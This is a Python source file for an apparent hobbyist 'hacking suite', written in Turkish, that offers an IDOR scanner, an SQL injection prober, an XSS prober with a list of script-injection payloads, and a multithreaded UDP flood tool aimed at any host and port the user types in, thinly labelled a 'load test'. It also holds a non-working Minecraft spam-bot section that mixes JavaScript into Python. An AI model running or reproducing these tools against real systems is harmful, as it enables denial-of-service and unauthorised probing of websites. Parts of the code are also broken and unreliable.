import socket
import threading
import time
import requests
import random
import sys
toplam_gonderilen = 0
sayac_kilidi = threading.Lock()
saldiri_devam_ediyor = True

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

try:
    mineflayer = require('mineflayer')
except Exception:
    pass

def minecraft_bot_gorevi(bot_adi, hedef_host, hedef_port, sunucu_durumu, sunucu_surumu):
    try:
        bot_ayarlari = {
            'host': hedef_host,
            'port': int(hedef_port),
            'username': bot_adi,
            'version': sunucu_surumu
        }
        
        if sunucu_durumu == 'h':
            bot_ayarlari['auth'] = 'offline'
            
        bot = mineflayer.createBot(bot_ayarlari)
        
        if sunucu_durumu == 'h':
            @bot.once('spawn')
            def on_spawn(this):
                time.sleep(0.8)
                
                bot.chat("/register MrV1zo123 MrV1zo123")
                time.sleep(0.5)
                
            
                
                bot.chat("Bot Ordusu Sunucuda reisss SPAM!")
                
    except Exception:
        pass

def saldiri(hedef_ip, bandwidth_port):
    global toplam_gonderilen, saldiri_devam_ediyor
    veri_paketi = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while saldiri_devam_ediyor:
        try:
            sock.sendto(veri_paketi, (hedef_ip, bandwidth_port))
            with sayac_kilidi:
                toplam_gonderilen += 1
        except Exception:
            pass

def gosterge_paneli(baslangic_zamani, saldiri_suresi):
    global saldiri_devam_ediyor
    while time.time() - baslangic_zamani < saldiri_suresi:
        kalan_sure = int(saldiri_suresi - (time.time() - baslangic_zamani))
        print(f"\r[*] Yuk testi devam ediyor... Kalan Sure: {kalan_sure} saniye | Paket: {toplam_gonderilen}", end="")
        time.sleep(1)
    saldiri_devam_ediyor = False          


print(r"""
      __  __      __      __ __ __________ 

     |  \/  |     \ \    / /_ |___  /  __ \
     | \  / | ___  \ \  / / | |  / /| |  | |
     | |\/| |/ __|  \ \/ /  | | / / | |  | |
     | |  | | (__    \  /   | |/ /__| |__| |
     |_|  |_|\___|    \/    |_/_____/\____/ 
                                       
[ MrV1zo Hacking Suite ]  [ Developed By MrV1zo ]
""")
print("1 -> TRIDOR (IDOR Tarayıcı)")
print("2 -> TRSQL (SQL Injection Tarayıcı)")
print("3 -> TRXSS (XSS Tarayıcı)")
print("4 -> DDOS ATTACKER (DDoS Aracı))")

    
    
secim = input("\nYapilacak islemi sec reis (1-6): ")
1
if secim == "1":
        print(r"""  _______ _____  _____ _____   ____  _____  

 |__   __|  __ \|_   _|  __ \ / __ \|  __ \ 
    | |  | |__) | | | | |  | | |  | | |__) |
    | |  |  _  /  | | | |  | | |  | |  _  / 
    | |  | | \ \ _| |_| |__| | |__| | | \ \ 
    |_|  |_|  \_\_____|_____/ \____/|_|  \_\
                                            
          [ Developed By MrV1zo ]           
""")
        hedef_url = input("Hedef URL'yi girin (Orn: http://test.com): ")
        parametre_adi = input("Taranacak parametre adini girin (Orn: id, user_id, uid): ")
        baslangic_id = int(input("Baslangic ID degerini girin (Orn: 100): "))
        bitis_id = int(input("Bitis ID degerini girin (Orn: 150): "))
        
        print(f"\n[*] {hedef_url} adresi icin IDOR taramasi baslatiliyor...\n")
        
        istek_basliklari = {
            "User-Agent": random.choice(user_agents),
            "Cookie": "session_id=ORNEK_KIMLIK_DOGRULAMA"
        }
        
        try:
            referans_yanit = requests.get(hedef_url, params={parametre_adi: baslangic_id}, headers=istek_basliklari, timeout=3)
            referans_boyut = len(referans_yanit.text)
        except requests.exceptions.RequestException:
            print("[-] Hedef sunucuya ilk baglanti saglanamadi aminum")
            referans_boyut = 0
            
        if referans_boyut > 0:
            for idor in range(baslangic_id, bitis_id + 1):
                parametre = {parametre_adi: idor}
                try:
                    yanit = requests.get(hedef_url, params=parametre, headers=istek_basliklari, timeout=3)
                    
                    if yanit.status_code == 200:
                        guncel_boyut = len(yanit.text)
                        
                        if guncel_boyut != referans_boyut:
                            print(f"[+] POTANSIYEL IDOR BULUNDU == {parametre_adi}: {idor} (Farkli Veri Boyutu: {guncel_boyut})")
                        else:
                            print(f"[-] {parametre_adi}: {idor} aktif ama veriler ayni duruyor.")
                            
                    else:
                        print(f"[-] {parametre_adi}: {idor} erisime kapali. HTTP {yanit.status_code}")
                        
                except requests.exceptions.RequestException:
                    print(f"[-] ID {idor} icin istek zaman asimina ugradi, geciliyor...")
                    continue
                    
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")

if secim == "2":

        print(r"""  _______ _____   _____  ____  _       

                        |__   __|  __ \ / ____|/ __ \| |      
                        | |  | |__) | | | | |  | | |      
                        | |  |  _  / \___ \| |  | | |      
                        | |  | | \ \ ____) | |__| | |____  
                        |_|  |_|  \_\_____/ \___\_\______| 
                                       
                            [ Developed By MrV1zo ]        
""")
        sql_url = input("SQL acigi aranacak site URL'sini girin (Orn: http://test.com): ")
        parametre_adi = input("Test edilecek parametre adini girin (Orn: id, search, cat): ")
        print(f"\n[*] SQL Acigi taramasi yapiliyor...\n")
        
        payloadlar = ["'", '"', "' OR 1=1 --", '" OR 1=1 --']
        hata_kelimeleri = ["sql syntax", "mysql", "mariadb", "postgresql", "oracle", "syntax error"]
        
        for sql in payloadlar:
            parametre = {parametre_adi: sql}
            try:
                yanit = requests.get(sql_url, params=parametre, headers={"User-Agent": random.choice(user_agents)}, timeout=3)
                sayfa_icerigi = yanit.text.lower()
                
                acik_var_mi = any(kelime in sayfa_icerigi for kelime in hata_kelimeleri)
                
                if acik_var_mi or yanit.status_code == 500:
                    print(f"[+] Jackpotttt!!! SQL acigi bulundu amk!")
                    print(f"    Calisan Payload: {sql}")
                    break
                else:
                    print(f"[-] Sql acigi yok kanka gecmis olsun... Payload: {sql}")
            except requests.exceptions.RequestException:
                print(f"[-] Payload {sql} icin istek zaman asimina ugradi, digerine geciliyor...")
                continue
                
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")
if secim == "3":
        print(r"""
  _______ _____  __   _________  _____ 

 |__   __|  __ \ \ \ / /  ____|/ ____|
    | |  | |__) | \ V /| |__  | (___  
    | |  |  _  /   > < |  __|  \___ \ 
    | |  | | \ \  / . \| |____ ____) |
    |_|  |_|  \_\/_/ \_\______|_____/ 
                                       
          [ Developed By MrV1zo ]      
""")

        xss_url = input("XSS açığı aranacak site URL'sini girin (Orn: http://test.com): ")
        parametre_adi = input("Test edilecek parametre adini girin (Orn: id, q, search): ")

        payloadlar = [
            "<script>alert(1)</script>",
            '"><script>alert("XSS")</script>',
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><svg onload=alert(1)>',
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<sCripT>alert(1)</sCripT>",
            '"><input type="text" autofocus onfocus="alert(1)">',
            "';alert(1)//",
            "\";alert(1)//",
            "<marquee onstart=alert(1)>XSS</marquee>",
            "<details open ontoggle=alert(1)>"
        ]

        for xss in payloadlar:
            parametre = {parametre_adi: xss}
            istek_basliklari = {"User-Agent": random.choice(user_agents)}

            try:
                yanit = requests.get(xss_url, params=parametre, headers=istek_basliklari, timeout=3)

                if xss in yanit.text:
                    print(f"[+] Jackpottt!!!! reisim XSS açığını bulduk vallaha hee")
                    print(f"    Çalışan Kod: {xss}")
                    break
                else:
                    print(f"[-] Kod oraya gitti ya çalışmadı ya da engellendi: {xss}")
            except requests.exceptions.RequestException:
                print(f"[-] Payload {xss} için istek zaman aşımına uğradı, diğerine geçiliyor reis...")
                continue
                
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")


if secim == "4":
        print(r"""
  _____  _____   ____   _____           _______ _______       _____ _  ________ _____  

 |  __ \|  __ \ / __ \ / ____|   /\    |__   __|__   __|/\   / ____| |/ /  ____|  __ \ 
 | |  | | |  | | |  | | (___    /  \      | |     | |  /  \ | |    | ' /| |__  | |__) |
 | |  | | |  | | |  | |\___ \  / /\ \     | |     | | / /\ \| |    |  < |  __| |  _  / 
 | |__| | |__| | |__| |____) |/ ____ \    | |     | |/ ____ \ |___| . \| |____| | \ \ 
 |_____/|_____/ \____/|_____//_/    \_\   |_|     |_/_/    \_\_____|_|\_\______|_|  \_\
""")
        hedef_host_girisi = input("Test edilecek hedef IP veya Domain adresini girin: ")
        bandwidth_port = int(input("Port numarasini girin (Orn: 80 veya 443): "))
        saldiri_suresi = int(input("Yuk testi suresi (Saniye): "))
        thread_sayisi = int(input("Thread (Kanal) sayisini girin (Orn: 50): "))
        
        try:
            hedef_ip = socket.gethostbyname(hedef_host_girisi)
            print(f"[+] Domain Cozuldu -> Hedef IP: {hedef_ip}")
        except socket.gaierror:
            hedef_ip = hedef_host_girisi
            print(f"[*] IP adresi dogrudan kabul edildi: {hedef_ip}")
            
        toplam_gonderilen = 0
        saldiri_devam_ediyor = True
        baslangic_zamani = time.time()
        
        print(f"\n[*] {hedef_ip}:{bandwidth_port} uzerinde canli veri akisi baslatildi...\n")
        
        for _ in range(thread_sayisi):
            t = threading.Thread(target=saldiri, args=(hedef_ip, bandwidth_port))
            t.daemon = True
            t.start()
            
        gosterge_paneli(baslangic_zamani, saldiri_suresi)
        saldiri_devam_ediyor = False
        print(f"\n\n[+] Yuk testi tamamlandi. Toplam Basarili Paket: {toplam_gonderilen}")
        input("\nAna menuye donmek icin Enter'a bas reis...")
